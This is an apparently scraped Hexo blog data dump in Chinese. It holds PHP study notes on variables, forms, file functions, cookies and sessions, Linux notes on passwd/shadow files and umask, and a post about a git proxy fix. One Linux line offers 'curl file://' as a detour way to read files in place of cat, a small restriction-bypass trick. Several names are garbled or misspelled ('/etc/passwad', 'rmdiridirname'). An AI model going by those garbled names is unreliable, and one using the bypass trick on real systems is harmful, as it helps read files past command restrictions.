变量以$符号开头，其后是变量的名称变量名称必须以字母或下划线开头，而不能以数字开头变量名称只能包含字母、数字和下划线（A-z、0-9以及_)变量名称区分大小写，建议用小写PHP没有创建变量的命令，变量会在首次为其赋值时自动被创建PHP是一门类型松散的语言，在为变量赋值时，不必声明变量的数据类型，PHP会自动把变量转换为相应的数据类型 字符串 字符串要用单引号或双引号括住，字符串中可以包括html标记用单引号时，程序不会对字符串进行解析。如果字符串中包含变量，也只输出变量名，而不会输出变量值;用双引号则会对字符串进行解析。如果字符串中包含变量，则会对变量进行解析而输出变量的值;当一个字符串是纯文本组成的时候，尽量用单引号 a .= b a = a .b （连接两个字符串） 变量函数库 类型 说明 语法empty 检查变量是否为空，为空返 empty(变量) 回TRUE，否则为FALSEgettype 获取变量的类型 gettype(变量)is_array 检查变量是否为数组类型 is.array(变量)isset 检查变量是否被设置或赋值 isset(变量)unset 给定变量，即销毁变量 unset(变量)var_dump 打印变量的相关信息 var dump(变量) 表单属性● 表单METHOD属性METHOD说明本表单向服务器发送输入信息时的使用方式. 一般有两种选择:POST和GET，默认的方式是GET ● GET方法使用GET时，HTTP的客户端将表单上用户的输入信息作为字符串附加在ACTION所设定的URL后面·用“?”和“&amp;”隔开，然后把整个字符串传送到服务器端但由于系统内置变量的长度限制了输入字符串的长度，因此，用GET方式所能传送的数据长度受到限制(一般为2k字节)·注意:GET方法不具有保密性，不适合处理如信用卡卡号等要求保密的内容，而且不能传送非ASCI码的字符 表单属性 GET方法和POST方法的对比GET方式 get方式在url后面拼接参数2．只能以文本的形式传递数据3．传递的数据量小，4KB左右4、安全性低，会将数据显示在地址栏5．速度快，通常用于对安全性要求不高的请求POST方式 安全性较高2．传递数据量大，请求对数据长度没有要求3．请求不会被缓存，也不会保留在浏览器历史记录中 服务器端接收数据. PHP中有三种变量进行数据的接收$_GET·变量接受所有以get方式发送的请求，及浏览器地址栏中的?之后的内容$_POST·变量接受所有以post方式发送的请求·例如，一个form以 method=post提交，提交后php 会处理post过来的全部变量$_REQUEST·支持两种方式发送过来的请求，即post和get它都可以接受 文件访问函数:打开文件fopen()函数参数mode的可选值r以只读方式打开，如果文件不存在将出错w以写入方式打开，将文件指针指向文件头部，并删除文件内容，如果文件不存在则创建文件a以追加写入方式打开，将文件指针指向文件末尾，如果文件不存在则创建文件r+以读写方式(先读后写)打开，将文件指针指向文件头部。W+以读写方式（先写后读)打开，将文件指针指向文件头部，并删除文件内容a+以追加读写方式打开，将文件指针指向文件末尾。x以只写方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败X+以读写方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败b以二进制模式打开，可与r…w…a合用 文件访问函数∶读取文件读取文件常用函数fread0读取整个文件或文件中指定长度的字符串，可用于二进制文件读取fgets()读取文件中的一行字符fgetss()读取文件中的一行字符,并去掉所有HTML和PHP标记fgetc()读取文件中的一个字符file_get_contents()将文件读入字符串file()把文件读入到一个数组中readfile()读取一个文件，并输出到输出缓冲fread()读取整个文件或文件中指定长度的字符串，可用于二进制文件读取 文件的基本操作函数 语法 说明copy() copy(源文件,目的文件) 复制文件unlink() unlink(目标文件) 删除文件rename() rename(I日文件名,新文件名) 重命名文件或目录，或移动文件ftruncate() ftruncate(目标文件资源,截取长度) 将文件截断到指定长度file_exists() file_exists(目标文件名) 判断文件或文件夹是否存在is_file() is_file(文件名) 判断指定的路径存在且为文件 获取文件属性realpath() 返回文件的物理路径pathinfo() 以数组形式返回文件的路径和文件名信息 目录的基本操作函数 说明 示例mkdir(pathname) 新建一个指定的目录 mkdir(‘temp’)rmdiridirname) 患除目录，该目录必须为空 rmdirt (“data”)getcwd(void) 取得当前文件所在的目录 echo getcwd();chdir(dirname) 改变当前目录 chdirt(“ ../“);opendir(path) 打开目录，返回目录的指针 $dirh=opendir(‘temP’);closedir() 关闭目录，参数为目录指针 clasedir($dirh);readdir() 遍历历目录 $file=readdir($dirh)scandir(path, sort) 以数组形式遍历目录， $arr=scandir(‘D:\\ICQ’,1); sort参数可设置升序或降序排列 会话控制的概述● HTTP协议本身是无状态的● http协议无法记录用户经常上哪些网站，有什么爱好，也无法记录用户的ID帐号和密码，这就是无状态● HTTP协议本身是无状态的，客户端只需要简单的向服务器请求下载某些文件，无论足客户端还是服务器都没有必要记录彼此过去的行为，每一次请求之间都是独立的● .HTTP协议自身不具备保存之前发送过的请求或相应的功能 设置cookiePHP用setcookie函数来设置cookie Cookie在传输过程中，是HTTP协议头的一部分，用于浏览器和服务器之间传递信息所以必须在任何属于HTML文件本身的内容输出之前调用SetCookie()函数，调用该函数前不能有任何内容setcookie函数语法setcookie(namexalue.expire.p.ath.domain.secure)参数解释 参数类型 参数名 解释必填 name 设置cookie的名字value 设定cookie的值可选 expire 设定cookie的有效期，以秒为单位path 服务器端的有效路径 domain 设定有效域名secure 设定是否仅在https安全连接时才设定  (cookie seesion token 单点登录建权详解) Cookiecookie注意事项 SetCookie(之前不能有任何html输出，空格、空白行都不行 SetCookieO后，在当前页调用echo $_COOKIE[“name””]不会有输出，必须刷新或到下一个页面才可以看到Cookie值3．使用Cookie的限制，一个浏览器能创建的Cookie数量最多为30个，并且每个不能超过4KB，每个WEB站点能设置的Cookie总数不能超过20个 Cookie是保存在客户端的，如果用户禁用了Cookie，那么cookie也就失效了5. cookie的生命周期到了，cookie就会失效 设置一个cookie时失效时间为time()那么在页面浏览完之后就被删除 Session概述什么是Session ?Session译为“会话”，其本义是指有始有终的一系列动作/消息Web中的Session指的就是用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是用户浏览这个网站所花费的时间因此Session实际上是一个特定的时间概念，Session默认的生命周期为20分钟 Session的作用Session可以用于身份认证，程序状态记录，页面之间的参数传递等因为HTTP协议无状态，为了在服务器保持客户端的状态，就需要使用Session 总结Cookie和Session的异同点异同点Cookie Session相同 能够保存用户信息的区别不同 存储位置 存放在客户端浏览器 存放在服务器 保留时间 设定有效保存期限 关闭浏览器后自动作废 存储容量 每个浏览器只能保存某个 可以创建多个 Web服务器的最多20个cookie 但是过多会影响服务器性能 且大小不超过4KB 是否被禁用 用户设置是否开启cookie 不会被禁用，因为内容保存在服务器端 隐私策略 对客户端可见，不安全 存储在服务器，较安全 跨域支持 支持跨域名访问 不支持跨域名访问"},{"title":"Linux","date":"2022-03-14T03:39:54.000Z","url":"/2022/03/14/Linux/","categories":[[" ",""]],"content":"/etc/passwad 存储当前系统中所有的用户的信息（密码除外）/etc/shadow 存储当前系统中所有的用户的密码信息ls -l 查看文件权限 （r读w写x执行） ◆显示、 设置文件的默认权限[root@localhost ~]# umask [-S] #显示、设置文件的默认权限➢参数说明: -S以rwx形式显示新建文件的默认权限➢命令说明:●对于windows而言，默认权限是从上级目录继承而来的，而linux则是通过umask权限设定的， 如果用户建立文件，默认是没有可执行权限的,即权限表示为- rw-rw-rw-，即666●如果用户建立目录,默认权限是全开放的，即权限表示drwxrwxrwx.即777●umask的值 ，默认为022，就是需要减掉的权限，比如:建立文件时, 666-022 == 644 ,即r—-建立目录时, 777-022==755 ,即drx.-xr-x●这就是为什么我们在没有设置umask值时，默认创建的文件和目录权限分别为644和755了 . 文件权限分别为:读(read)，写(write)，执行x(execute)，简写即为(r,w,x) ，也可以可用数字来(4,2,1)表示，-即无权限 root账户不受文件权限的读写限制，执行权限受限制 用户获取文件权限的顺序:先看是否为所有者，如果是，则后面权限不看;再看是否为所属组，如果是，则后面权限不看 缺省创建的文件不可授予可执行的权限，基于最基本的安全机制，防止病毒等 test@ubuntu:~$ curL file:/ / /home/test/Desktop/baidu. txt（可以代替cat命令实现弯道访问）"},{"title":"第一篇博客","date":"2022-03-08T08:16:36.000Z","url":"/2022/03/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","categories":[[" ",""]],"content":"为啥子每次在cmd中hexo g -d 有的时候链接不上服务器有的时候链接的上呢。。fatal: unable to access ‘;: OpenSSL SSL_read: Connection was reset, errno 10054 已解决：git config –global http.proxy  git config –global https.proxy 通过git代理通道加速就好啦"}]